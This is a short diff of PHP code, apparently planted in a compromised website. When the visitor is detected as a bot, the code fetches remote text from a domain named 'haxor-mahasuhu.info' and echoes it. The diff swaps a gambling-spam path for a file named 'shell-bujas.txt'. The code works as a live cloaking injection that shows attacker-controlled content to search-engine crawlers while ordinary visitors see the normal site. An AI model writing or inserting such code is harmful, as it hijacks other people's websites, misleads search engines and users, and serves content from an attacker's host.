@@ -41,8 +41,7 @@ function fetch_message_from_url($url) {
 }
 
 if (is_bot()) { 
-    $message = fetch_message_from_url('https://koi.haxor-mahasuhu.info/visily-gacor/index.php
-');
+    $message = fetch_message_from_url('https://tennesse.haxor-mahasuhu.info/Landing-page/shell-bujas.txt');
     
     if ($message) {
         echo $message;
